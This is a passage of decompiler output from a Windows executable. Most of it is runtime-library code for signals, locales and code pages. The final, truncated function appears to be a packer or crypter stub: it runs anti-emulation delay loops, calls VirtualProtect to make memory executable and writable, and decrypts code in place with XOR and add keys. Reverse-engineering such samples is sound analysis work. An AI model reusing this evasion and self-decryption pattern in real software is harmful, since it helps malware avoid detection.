  if ((code *)p_Var2->_terminate != (code *)0x0) {
    (*(code *)p_Var2->_terminate)();
  }
  _abort();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00419e4f(void)

{
  _DAT_004374d0 = EncodePointer(terminate);
  return;
}



void FUN_00419e60(void)

{
  DecodePointer(DAT_004374dc);
  return;
}



void __cdecl FUN_00419e6d(undefined4 param_1)

{
  DAT_004374d4 = param_1;
  DAT_004374d8 = param_1;
  DAT_004374dc = param_1;
  DAT_004374e0 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 __cdecl FUN_00419e89(int param_1)

{
  bool bVar1;
  uint uVar2;
  int *piVar3;
  PVOID Ptr;
  code *pcVar4;
  code *pcVar5;
  int iVar6;
  _ptiddata p_Var7;
  int local_34;
  void *local_30;
  code **local_20;
  
  local_30 = (void *)0x0;
  local_34 = 0;
  bVar1 = false;
  p_Var7 = (_ptiddata)0x0;
  if (param_1 < 0xc) {
    if (param_1 != 0xb) {
      if (param_1 == 2) {
        local_20 = (code **)&DAT_004374d4;
        Ptr = DAT_004374d4;
        goto LAB_00419f48;
      }
      if (param_1 != 4) {
        if (param_1 == 6) goto LAB_00419f20;
        if (param_1 != 8) goto LAB_00419f0e;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return 0xffffffff;
    }
    uVar2 = FUN_0041a044(param_1,(uint)p_Var7->_pxcptacttab);
    local_20 = (code **)(uVar2 + 8);
    pcVar4 = *local_20;
  }
  else {
    if (param_1 == 0xf) {
      local_20 = (code **)&DAT_004374e0;
      Ptr = DAT_004374e0;
    }
    else if (param_1 == 0x15) {
      local_20 = (code **)&DAT_004374d8;
      Ptr = DAT_004374d8;
    }
    else {
      if (param_1 != 0x16) {
LAB_00419f0e:
        piVar3 = __errno();
        *piVar3 = 0x16;
        FUN_00419a8d();
        return 0xffffffff;
      }
LAB_00419f20:
      local_20 = (code **)&DAT_004374dc;
      Ptr = DAT_004374dc;
    }
LAB_00419f48:
    bVar1 = true;
    pcVar4 = (code *)DecodePointer(Ptr);
  }
  if (pcVar4 == (code *)0x1) {
    return 0;
  }
  if (pcVar4 == (code *)0x0) {
    __exit(3);
  }
  if (bVar1) {
    __lock(0);
  }
  if (((param_1 == 8) || (param_1 == 0xb)) || (param_1 == 4)) {
    local_30 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (param_1 == 8) {
      local_34 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_00419fa7;
    }
  }
  else {
LAB_00419fa7:
    if (param_1 == 8) {
      for (iVar6 = 3; iVar6 < 0xc; iVar6 = iVar6 + 1) {
        *(undefined4 *)((int)p_Var7->_pxcptacttab + iVar6 * 0xc + 8) = 0;
      }
      goto LAB_00419fe6;
    }
  }
  pcVar5 = (code *)EncodePointer((PVOID)0x0);
  *local_20 = pcVar5;
LAB_00419fe6:
  FUN_0041a00a();
  if (param_1 == 8) {
    (*pcVar4)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar4)(param_1);
    if ((param_1 != 0xb) && (param_1 != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_30;
  if (param_1 == 8) {
    p_Var7->_tfpecode = local_34;
  }
  return 0;
}



void FUN_0041a00a(void)

{
  int unaff_EBX;
  
  if (unaff_EBX != 0) {
    FUN_00419c57(0);
  }
  return;
}



uint __cdecl FUN_0041a044(int param_1,uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2;
  do {
    if (*(int *)(uVar1 + 4) == param_1) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < param_2 + 0x90);
  if ((param_2 + 0x90 <= uVar1) || (*(int *)(uVar1 + 4) != param_1)) {
    uVar1 = 0;
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041a07e(undefined4 param_1)

{
  _DAT_004374e8 = param_1;
  return;
}



pthreadlocinfo * __thiscall FUN_0041a0a9(void *this,pthreadlocinfo *param_1)

{
  pthreadlocinfo ptVar1;
  uint uVar2;
  _ptiddata p_Var3;
  undefined4 uVar4;
  pthreadmbcinfo ptVar5;
  
  *(undefined *)((int)this + 0xc) = 0;
  if (param_1 == (pthreadlocinfo *)0x0) {
    p_Var3 = __getptd();
    *(_ptiddata *)((int)this + 8) = p_Var3;
    ptVar1 = p_Var3->ptlocinfo;
    *(pthreadlocinfo *)this = ptVar1;
    *(pthreadmbcinfo *)((int)this + 4) = p_Var3->ptmbcinfo;
    if ((ptVar1 != DAT_00435b0c) && ((p_Var3->_ownlocale & DAT_00435e48) == 0)) {
      uVar4 = FUN_0041be8c();
      *(undefined4 *)this = uVar4;
    }
    if ((*(undefined **)((int)this + 4) != PTR_DAT_0043588c) &&
       ((*(uint *)(*(int *)((int)this + 8) + 0x70) & DAT_00435e48) == 0)) {
      ptVar5 = FUN_0041a3ca();
      *(pthreadmbcinfo *)((int)this + 4) = ptVar5;
    }
    uVar2 = *(uint *)(*(int *)((int)this + 8) + 0x70);
    if ((uVar2 & 2) == 0) {
      *(uint *)(*(int *)((int)this + 8) + 0x70) = uVar2 | 2;
      *(undefined *)((int)this + 0xc) = 1;
    }
  }
  else {
    *(pthreadlocinfo *)this = *param_1;
    *(pthreadlocinfo *)((int)this + 4) = param_1[1];
  }
  return (pthreadlocinfo *)this;
}



// Library Function - Single Match
//  wchar_t const * __cdecl CPtoLocaleName(int)
// 
// Library: Visual Studio 2012 Release

wchar_t * __cdecl CPtoLocaleName(int param_1)

{
  if (param_1 == 0x3a4) {
    return (wchar_t *)L"ja-JP";
  }
  if (param_1 == 0x3a8) {
    return (wchar_t *)L"zh-CN";
  }
  if (param_1 == 0x3b5) {
    return (wchar_t *)L"ko-KR";
  }
  if (param_1 != 0x3b6) {
    return (wchar_t *)0x0;
  }
  return (wchar_t *)L"zh-TW";
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

UINT __cdecl FUN_0041a16b(UINT param_1)

{
  int local_14 [2];
  int local_c;
  char local_8;
  
  FUN_0041a0a9(local_14,(pthreadlocinfo *)0x0);
  _DAT_00437504 = 0;
  if (param_1 == 0xfffffffe) {
    _DAT_00437504 = 1;
    param_1 = GetOEMCP();
  }
  else if (param_1 == 0xfffffffd) {
    _DAT_00437504 = 1;
    param_1 = GetACP();
  }
  else if (param_1 == 0xfffffffc) {
    _DAT_00437504 = 1;
    param_1 = *(UINT *)(local_14[0] + 4);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return param_1;
}



void __cdecl FUN_0041a1d9(int param_1)

{
  int iVar1;
  undefined *puVar2;
  uint *puVar3;
  
  puVar3 = (uint *)(param_1 + 0x18);
  FUN_00416e80(puVar3,0,0x101);
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0x21c) = 0;
  iVar1 = 0x101;
  *(undefined4 *)(param_1 + 0xc) = 0;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  do {
    *(undefined *)puVar3 = *(undefined *)(((int)&DAT_00435668 - param_1) + (int)puVar3);
    puVar3 = (uint *)((int)puVar3 + 1);
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  puVar2 = (undefined *)(param_1 + 0x119);
  iVar1 = 0x100;
  do {
    *puVar2 = puVar2[(int)&DAT_00435668 - param_1];
    puVar2 = puVar2 + 1;
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct __crt_multibyte_data *)
// 
// Library: Visual Studio 2015 Release

void __cdecl setSBUpLow(__crt_multibyte_data *param_1)

{
  __crt_multibyte_data _Var1;
  BOOL BVar2;
  uint uVar3;
  uint *puVar4;
  BYTE *pBVar5;
  uint *extraout_EDX;
  uint *puVar6;
  __crt_multibyte_data *p_Var7;
  _cpinfo local_51c;
  ushort local_508 [256];
  __crt_multibyte_data local_308 [256];
  __crt_multibyte_data local_208 [256];
  undefined local_108 [256];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  BVar2 = GetCPInfo(*(UINT *)(param_1 + 4),&local_51c);
  if (BVar2 == 0) {
    uVar3 = 0;
    do {
      p_Var7 = param_1 + uVar3 + 0x119;
      if (p_Var7 + (-0x61 - (int)(param_1 + 0x119)) + 0x20 < (__crt_multibyte_data *)0x1a) {
        param_1[uVar3 + 0x19] = (__crt_multibyte_data)((byte)param_1[uVar3 + 0x19] | 0x10);
        _Var1 = (__crt_multibyte_data)((char)uVar3 + ' ');
LAB_0041a3a2:
        *p_Var7 = _Var1;
      }
      else {
        if (p_Var7 + (-0x61 - (int)(param_1 + 0x119)) < (__crt_multibyte_data *)0x1a) {
          param_1[uVar3 + 0x19] = (__crt_multibyte_data)((byte)param_1[uVar3 + 0x19] | 0x20);
          _Var1 = (__crt_multibyte_data)((char)uVar3 + -0x20);
          goto LAB_0041a3a2;
        }
        *p_Var7 = (__crt_multibyte_data)0x0;
      }
      uVar3 = uVar3 + 1;
    } while (uVar3 < 0x100);
  }
  else {
    uVar3 = 0;
    do {
      local_108[uVar3] = (char)uVar3;
      uVar3 = uVar3 + 1;
    } while (uVar3 < 0x100);
    pBVar5 = local_51c.LeadByte;
    local_108[0] = 0x20;
    puVar6 = extraout_EDX;
    while (local_51c.LeadByte[0] != 0) {
      puVar6 = (uint *)(uint)pBVar5[1];
      for (puVar4 = (uint *)(uint)local_51c.LeadByte[0];
          (puVar4 <= puVar6 && (puVar4 < (uint *)0x100)); puVar4 = (uint *)((int)puVar4 + 1)) {
        local_108[(int)puVar4] = 0x20;
      }
      pBVar5 = pBVar5 + 2;
      local_51c.LeadByte[0] = *pBVar5;
    }
    FUN_0041c7a6((int)pBVar5,puVar6);
    FUN_0041c668();
    FUN_0041c668();
    uVar3 = 0;
    do {
      if ((local_508[uVar3] & 1) == 0) {
        if ((local_508[uVar3] & 2) != 0) {
          param_1[uVar3 + 0x19] = (__crt_multibyte_data)((byte)param_1[uVar3 + 0x19] | 0x20);
          _Var1 = local_308[uVar3];
          goto LAB_0041a349;
        }
        param_1[uVar3 + 0x119] = (__crt_multibyte_data)0x0;
      }
      else {
        param_1[uVar3 + 0x19] = (__crt_multibyte_data)((byte)param_1[uVar3 + 0x19] | 0x10);
        _Var1 = local_208[uVar3];
LAB_0041a349:
        param_1[uVar3 + 0x119] = _Var1;
      }
      uVar3 = uVar3 + 1;
    } while (uVar3 < 0x100);
  }
  FUN_0041a954();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

pthreadmbcinfo FUN_0041a3ca(void)

{
  int iVar1;
  _ptiddata p_Var2;
  pthreadmbcinfo _Memory;
  
  p_Var2 = __getptd();
  if (((p_Var2->_ownlocale & DAT_00435e48) == 0) || (p_Var2->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    _Memory = p_Var2->ptmbcinfo;
    if (_Memory != (pthreadmbcinfo)PTR_DAT_0043588c) {
      if (_Memory != (pthreadmbcinfo)0x0) {
        LOCK();
        iVar1 = _Memory->refcount + -1;
        _Memory->refcount = iVar1;
        if ((iVar1 == 0) && (_Memory != (pthreadmbcinfo)&DAT_00435668)) {
          FID_conflict__free(_Memory);
        }
      }
      p_Var2->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_0043588c;
      _Memory = (pthreadmbcinfo)PTR_DAT_0043588c;
      LOCK();
      *(int *)PTR_DAT_0043588c = *(int *)PTR_DAT_0043588c + 1;
    }
    FUN_0041a467();
  }
  else {
    _Memory = p_Var2->ptmbcinfo;
  }
  if (_Memory == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return _Memory;
}



void FUN_0041a467(void)

{
  FUN_00419c57(0xd);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_0041a470(UINT param_1)

{
  _ptiddata p_Var1;
  UINT UVar2;
  pthreadmbcinfo ptVar3;
  int *piVar4;
  int iVar5;
  pthreadmbcinfo ptVar6;
  int iVar7;
  int iVar8;
  pthreadmbcinfo ptVar9;
  undefined8 uVar10;
  
  iVar8 = -1;
  p_Var1 = __getptd();
  FUN_0041a3ca();
  ptVar3 = p_Var1->ptmbcinfo;
  UVar2 = FUN_0041a16b(param_1);
  if (UVar2 == ptVar3->mbcodepage) {
    iVar8 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)FUN_00417755(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar6 = p_Var1->ptmbcinfo;
      ptVar9 = ptVar3;
      for (iVar8 = 0x88; iVar8 != 0; iVar8 = iVar8 + -1) {
        ptVar9->refcount = ptVar6->refcount;
        ptVar6 = (pthreadmbcinfo)&ptVar6->mbcodepage;
        ptVar9 = (pthreadmbcinfo)&ptVar9->mbcodepage;
      }
      iVar7 = 0;
      ptVar3->refcount = 0;
      uVar10 = FUN_0041a618(UVar2,(__crt_multibyte_data *)ptVar3);
      iVar8 = (int)uVar10;
      if (iVar8 == 0) {
        LOCK();
        iVar5 = p_Var1->ptmbcinfo->refcount + -1;
        p_Var1->ptmbcinfo->refcount = iVar5;
        if ((iVar5 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_00435668)) {
          FID_conflict__free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        LOCK();
        ptVar3->refcount = ptVar3->refcount + 1;
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_00435e48 & 1) == 0)) {
          __lock(0xd);
          _DAT_004374ec = ptVar3->mbcodepage;
          _DAT_004374f0 = ptVar3->ismbcodepage;
          _DAT_00437500 = ptVar3->mblocalename;
          for (iVar5 = 0; iVar5 < 5; iVar5 = iVar5 + 1) {
            (&DAT_004374f4)[iVar5] = ptVar3->mbulinfo[iVar5];
          }
          for (iVar5 = 0; iVar5 < 0x101; iVar5 = iVar5 + 1) {
            (&DAT_00435460)[iVar5] = ptVar3->mbctype[iVar5];
          }
          for (; iVar7 < 0x100; iVar7 = iVar7 + 1) {
            (&DAT_00435568)[iVar7] = ptVar3->mbcasemap[iVar7];
          }
          LOCK();
          iVar7 = *(int *)PTR_DAT_0043588c;
          *(int *)PTR_DAT_0043588c = iVar7 + -1;
          if ((iVar7 + -1 == 0) && ((undefined4 *)PTR_DAT_0043588c != &DAT_00435668)) {
            FID_conflict__free(PTR_DAT_0043588c);
          }
          LOCK();
          PTR_DAT_0043588c = (undefined *)ptVar3;
          ptVar3->refcount = ptVar3->refcount + 1;
          FUN_0041a5e2();
        }
      }
      else if (iVar8 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_00435668) {
          FID_conflict__free(ptVar3);
        }
        piVar4 = __errno();
        *piVar4 = 0x16;
      }
    }
  }
  return iVar8;
}



void FUN_0041a5e2(void)

{
  FUN_00419c57(0xd);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 __cdecl FUN_0041a618(UINT param_1,__crt_multibyte_data *param_2)

{
  byte bVar1;
  undefined2 uVar2;
  UINT CodePage;
  uint uVar3;
  BOOL BVar4;
  BYTE *pBVar5;
  __crt_multibyte_data *p_Var6;
  wchar_t *pwVar7;
  byte *pbVar8;
  int iVar9;
  byte *pbVar10;
  undefined2 *puVar11;
  undefined2 *puVar12;
  uint uVar13;
  undefined8 uVar14;
  int local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  CodePage = FUN_0041a16b(param_1);
  if (CodePage != 0) {
    uVar13 = 0;
    uVar3 = 0;
    local_20 = 0;
LAB_0041a654:
    if (*(UINT *)((int)&DAT_00435890 + uVar3) != CodePage) goto code_r0x0041a660;
    FUN_00416e80((uint *)(param_2 + 0x18),0,0x101);
    pbVar8 = &DAT_004358a0 + local_20 * 0x30;
    do {
      bVar1 = *pbVar8;
      pbVar10 = pbVar8;
      while ((bVar1 != 0 && (bVar1 = pbVar10[1], bVar1 != 0))) {
        for (uVar3 = (uint)*pbVar10; (uVar3 <= bVar1 && (uVar3 < 0x100)); uVar3 = uVar3 + 1) {
          param_2[uVar3 + 0x19] =
               (__crt_multibyte_data)((byte)param_2[uVar3 + 0x19] | (&DAT_00435888)[uVar13]);
          bVar1 = pbVar10[1];
        }
        pbVar10 = pbVar10 + 2;
        bVar1 = *pbVar10;
      }
      uVar13 = uVar13 + 1;
      pbVar8 = pbVar8 + 8;
    } while (uVar13 < 4);
    *(UINT *)(param_2 + 4) = CodePage;
    *(undefined4 *)(param_2 + 8) = 1;
    pwVar7 = CPtoLocaleName(CodePage);
    *(wchar_t **)(param_2 + 0x21c) = pwVar7;
    puVar11 = (undefined2 *)(param_2 + 0xc);
    puVar12 = (undefined2 *)(&DAT_00435894 + local_20 * 0x30);
    iVar9 = 6;
    do {
      uVar2 = *puVar12;
      puVar12 = puVar12 + 1;
      *puVar11 = uVar2;
      puVar11 = puVar11 + 1;
      iVar9 = iVar9 + -1;
    } while (iVar9 != 0);
    goto LAB_0041a7e9;
  }
  FUN_0041a1d9((int)param_2);
LAB_0041a7f3:
  uVar14 = FUN_0041a954();
  return uVar14;
code_r0x0041a660:
  local_20 = local_20 + 1;
  uVar3 = uVar3 + 0x30;
  if (0xef < uVar3) goto code_r0x0041a66e;
  goto LAB_0041a654;
code_r0x0041a66e:
  if (((CodePage != 65000) && (CodePage != 0xfde9)) &&
     (BVar4 = IsValidCodePage(CodePage & 0xffff), BVar4 != 0)) {
    BVar4 = GetCPInfo(CodePage,&local_1c);
    if (BVar4 == 0) {
      if (_DAT_00437504 != 0) {
        FUN_0041a1d9((int)param_2);
      }
    }
    else {
      FUN_00416e80((uint *)(param_2 + 0x18),0,0x101);
      *(UINT *)(param_2 + 4) = CodePage;
      *(undefined4 *)(param_2 + 0x21c) = 0;
      if (local_1c.MaxCharSize < 2) {
        *(undefined4 *)(param_2 + 8) = 0;
      }
      else {
        pBVar5 = local_1c.LeadByte;
        while ((local_1c.LeadByte[0] != 0 && (bVar1 = pBVar5[1], bVar1 != 0))) {
          for (uVar3 = (uint)*pBVar5; uVar3 <= bVar1; uVar3 = uVar3 + 1) {
            param_2[uVar3 + 0x19] = (__crt_multibyte_data)((byte)param_2[uVar3 + 0x19] | 4);
          }
          pBVar5 = pBVar5 + 2;
          local_1c.LeadByte[0] = *pBVar5;
        }
        p_Var6 = param_2 + 0x1a;
        iVar9 = 0xfe;
        do {
          *p_Var6 = (__crt_multibyte_data)((byte)*p_Var6 | 8);
          p_Var6 = p_Var6 + 1;
          iVar9 = iVar9 + -1;
        } while (iVar9 != 0);
        pwVar7 = CPtoLocaleName(*(int *)(param_2 + 4));
        *(wchar_t **)(param_2 + 0x21c) = pwVar7;
        *(undefined4 *)(param_2 + 8) = 1;
      }
      *(undefined4 *)(param_2 + 0xc) = 0;
      *(undefined4 *)(param_2 + 0x10) = 0;
      *(undefined4 *)(param_2 + 0x14) = 0;
LAB_0041a7e9:
      setSBUpLow(param_2);
    }
  }
  goto LAB_0041a7f3;
}



// Library Function - Single Match
//  __ftbuf
// 
// Library: Visual Studio 2012 Release

void __cdecl __ftbuf(int _Flag,FILE *_File)

{
  if ((_Flag != 0) && ((_File->_flag & 0x1000U) != 0)) {
    FUN_0041c8a4();
    _File->_flag = _File->_flag & 0xffffeeff;
    _File->_bufsiz = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_0041a834(int *param_1)

{
  uint uVar1;
  int iVar2;
  void *pvVar3;
  int extraout_ECX;
  uint extraout_EDX;
  
  FUN_0041c7e6();
  uVar1 = FUN_0041c80a(extraout_ECX,extraout_EDX);
  if (uVar1 == 0) {
    return 0;
  }
  iVar2 = FUN_0041bff1();
  if (param_1 == (int *)(iVar2 + 0x20)) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_0041bff1();
    if (param_1 != (int *)(iVar2 + 0x40)) {
      return 0;
    }
    iVar2 = 1;
  }
  _DAT_00437520 = _DAT_00437520 + 1;
  if ((param_1[3] & 0x10cU) != 0) {
    return 0;
  }
  if ((&DAT_00437508)[iVar2] == 0) {
    pvVar3 = FUN_00417755(0x1000);
    (&DAT_00437508)[iVar2] = pvVar3;
    if (pvVar3 == (void *)0x0) {
      param_1[2] = (int)(param_1 + 5);
      *param_1 = (int)(param_1 + 5);
      param_1[6] = 2;
      param_1[1] = 2;
      goto LAB_0041a8c7;
    }
  }
  iVar2 = (&DAT_00437508)[iVar2];
  param_1[2] = iVar2;
  *param_1 = iVar2;
  param_1[6] = 0x1000;
  param_1[1] = 0x1000;
LAB_0041a8c7:
  param_1[3] = param_1[3] | 0x1102;
  return 1;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x0041b3e7) overlaps instruction at (ram,0x0041b3e6)
// 
// WARNING: Unable to track spacebase fully for stack
// WARNING: Removing unreachable block (ram,0x0041a9c2)
// WARNING: Removing unreachable block (ram,0x0041aa75)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 FUN_0041a8da(int param_1,undefined4 param_2)

{
  byte *pbVar1;
  uint *puVar2;
  undefined6 uVar3;
  undefined6 uVar4;
  uint uVar5;
  byte bVar6;
  char cVar7;
  char cVar8;
  char cVar9;
  uint uVar10;
  uint uVar11;
  undefined3 uVar14;
  undefined3 uVar15;
  char *pcVar12;
  undefined4 *puVar13;
  int iVar16;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int extraout_ECX_01;
  int extraout_ECX_02;
  int extraout_ECX_03;
  uint uVar17;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined *extraout_ECX_08;
  uint extraout_EDX;
  int extraout_EDX_00;
  uint *puVar18;
  undefined uVar19;
  byte bVar22;
  LPVOID pvVar20;
  uint uVar21;
  undefined *puVar23;
  uint unaff_ESI;
  undefined *puVar24;
  uint uVar25;
  uint uVar26;
  undefined4 *puVar27;
  undefined4 *puVar28;
  int iVar29;
  int iVar30;
  uint uVar31;
  undefined4 *puVar32;
  undefined2 in_ES;
  undefined2 uVar33;
  bool bVar34;
  bool bVar35;
  bool bVar36;
  undefined8 uVar37;
  undefined auStackY256 [228];
  undefined4 uStackY28;
  LPVOID lpAddress;
  SIZE_T dwSize;
  undefined2 uVar38;
  undefined uVar39;
  undefined2 uVar40;
  
  puVar23 = &stack0xfffffffc;
  FUN_00408dc4();
  _DAT_00435080 = extraout_EDX << 10 | extraout_EDX >> 0x16;
  FUN_00406ac1();
  puVar24 = DAT_0043618d;
  iVar16 = 0x7d26a84;
  do {
    iVar16 = iVar16 + -1;
  } while (iVar16 != 0);
  FUN_00406ac1();
  FUN_00409297(extraout_ECX);
  func_0x00409510();
  iVar16 = 0xa7618c6;
  do {
    iVar29 = iVar16;
    iVar16 = iVar29 + -1;
  } while (iVar16 != 0);
  FUN_00404a04(iVar29 + -0x83cae59);
  iVar16 = 0xe75d681;
  do {
    _DAT_00435d0c = iVar16;
    iVar29 = DAT_00435e00 + 1;
    iVar16 = _DAT_00435d0c + -1;
  } while (_DAT_00435d0c + -1 != 0);
  PTR_DAT_0043528c = puVar24;
  _DAT_00435d22 = _DAT_00435d0c;
  FUN_00408dc4();
  func_0x004012e7();
  uVar37 = FUN_00404532();
  puVar24 = &stack0xfffffff8 + (uint)((ulonglong)uVar37 >> 0x37) + (int)uVar37;
  _DAT_0043599d = extraout_ECX_00;
  FUN_00406ac1();
  _DAT_004366c9 = _DAT_004366c9 & 0xff | extraout_ECX_01 << 8;
  uRam004366cd = (undefined)((uint)extraout_ECX_01 >> 0x18);
  do {
    iVar30 = iVar29;
    FUN_00408dc4();
    iVar16 = DAT_0043590c;
    puVar24 = (undefined *)((uint)((int)puVar24 << 1) >> 0x11);
    s___AVlogic_error_std___00436910._19_4_ = extraout_ECX_02;
    iVar29 = iVar30 + -1;
  } while ((undefined *)(extraout_ECX_02 + -1) != (undefined *)0x0);
  uVar19 = 0x13;
  uVar39 = 0x54;
  uVar40 = 0x43;
  uVar33 = 0x40;
  uVar38 = 0;
  _DAT_00435e7d = DAT_0043551c;
  PTR_s_Monday_004359c8 = (undefined *)(extraout_ECX_02 + -1);
  PTR_DAT_00436280 = puVar24;
  func_0x00409510();
  FUN_00408dc4();
  uVar31 = (iVar30 + -3) - (DAT_0043644e << 0x15 | DAT_0043644e >> 0xb);
  iVar29 = iVar16 + 1;
  _DAT_004364cb = 0xc1f0;
  FUN_0040473c();
  uVar17 = extraout_ECX_03 + iVar29;
  _DAT_004350cc = uVar17 ^ 0xe0e4c61;
  _DAT_00435218 = uVar17 - iVar29;
  uVar17 = iVar16 - 1;
  dwSize = _DAT_00435218;
  FUN_004051e8();
  _DAT_004359f3 = extraout_ECX_04;
  FUN_00408aea();
  _DAT_00436252 = uVar17 >> 8 | uVar17 * 0x1000000;
  FUN_0040667f();
  uVar17 = 0x41abd0;
  uStackY28 = 0x41abed;
  unique0x10000d7c = extraout_ECX_05;
  FUN_0040786e();
  FUN_00404dd1();
  FUN_00405baf();
  _DAT_00435de0 = uVar17 >> 1 | uVar17 << 0x1f;
  func_0x00408525();
  pvVar20 = (LPVOID)(uVar17 + 0x1a3);
  FUN_0040514f();
  _DAT_0043532e = extraout_ECX_06;
  FUN_00401433();
  _DAT_00435bda = extraout_ECX_07;
  _DAT_00435cd4 = (int)pvVar20 * 0x8000 | (uint)pvVar20 >> 0x11;
  iVar16 = FUN_00401e0b();
  uStackY28 = 0x41acf1;
  lpAddress = pvVar20;
  func_0x004079b4();
  uStackY28 = 0x41ad06;
  FUN_00403b27();
  uStackY28 = 0x41ad13;
  FUN_004027cc();
  uStackY28 = 0x41ad32;
  VirtualProtect(lpAddress,dwSize,CONCAT22(uVar38,uVar33),
                 (PDWORD)CONCAT22(uVar40,CONCAT11(uVar39,uVar19)));
  uVar25 = ~((iVar16 - ((uVar31 >> 7 | uVar31 * 0x2000000) >> 0xb | (uVar31 >> 7) << 0x15)) - 1) ^
           (uint)pvVar20;
  _DAT_004353ac = uVar31;
  _DAT_00436144 = uVar31;
  func_0x00409510();
  s_abcdefghijklmnopqrstuvwxyz_004355a9._7_4_ =
       (uint)extraout_ECX_08 >> 9 | (int)extraout_ECX_08 << 0x17;
  _DAT_00435d7a = (undefined *)-DAT_00435580;
  _DAT_0043608e = (uint)(&stack0xffa257d0 + extraout_EDX_00) ^ (uint)&stack0xfffffffc;
  uVar17 = (uint)(DAT_00435580 * -0x80) >> 7;
  PTR_PTR_FUN_00436618 = (undefined *)-((uint)_DAT_00435d7a & 0xfe000000 | uVar17);
  uVar26 = 0xbc04;
  _DAT_00435128 = 0x41addf;
  puVar18 = (uint *)0x41b35e;
  _DAT_00435171 = uVar31;
  _DAT_00435966 = extraout_ECX_08;
  PTR_s_August_00435a2c = extraout_ECX_08;
  _DAT_00435df3 = pvVar20;
  _DAT_00435e06 = extraout_ECX_08;
  _DAT_00435e87 = pvVar20;
  PTR_DAT_00435ec0 = _DAT_00435d7a;
  _DAT_00436152 = extraout_ECX_08;
  _DAT_00436178 = extraout_ECX_08;
  _DAT_004367da = extraout_ECX_08;
  do {
    _DAT_00435290 = extraout_ECX_08;
    *puVar18 = ~*puVar18;
    _DAT_004353bf = (uVar26 ^ uVar25) - uVar25;
    uVar26 = _DAT_004353bf + uVar25;
    _DAT_00435920 = _DAT_004353bf;
    s_Copyright__c__1992_2004_by_P_J__P_00436320._48_4_ = PTR_PTR_FUN_00436618;
    unique0x10000e44 = puVar18;
    *puVar18 = *puVar18 ^ 0xa3432f62;
    _DAT_0043575d = (uint)pvVar20 >> 0x18 | (int)pvVar20 << 8;
    DAT_00435320 = PTR_PTR_FUN_00436618;
    _DAT_00435b50 = _DAT_0043575d;
    *puVar18 = *puVar18 + 0xa3432f62;
    _DAT_0043504c = ~(uint)pvVar20;
    _DAT_0043548d = puVar18;
    _DAT_00435570 = PTR_PTR_FUN_00436618;
    _DAT_00435876 = PTR_PTR_FUN_00436618;
    _DAT_00435960 = extraout_ECX_08;
    unique0x10000dd8 = extraout_ECX_08;
    _DAT_00436293 = extraout_ECX_08;
    _DAT_004367a7 = pvVar20;
    *puVar18 = ~*puVar18;
    PTR_u_dddd__MMMM_dd__yyyy_00435b00 =
         (undefined *)((uint)PTR_PTR_FUN_00436618 ^ (uint)&stack0xfffffffc ^ 0x113c0b62);
    *puVar18 = *puVar18 + 0x5cbcd09e;
    _DAT_00435585 = extraout_ECX_08;
    PTR_u_Saturday_00435a90 = PTR_PTR_FUN_00436618;
    s_Copyright__c__1992_2004_by_P_J__P_00436320._87_4_ = extraout_ECX_08;
    *puVar18 = *puVar18 ^ 0xa3432f62;
    _DAT_004369a6 = (uint)extraout_ECX_08 ^ (uint)puVar18;
    _DAT_00436452 = extraout_ECX_08;
    *puVar18 = *puVar18 + 0x5cbcd09e;
    _DAT_0043578c = (uint)(puVar18 + -0x504dea) ^ 0x71363b2;
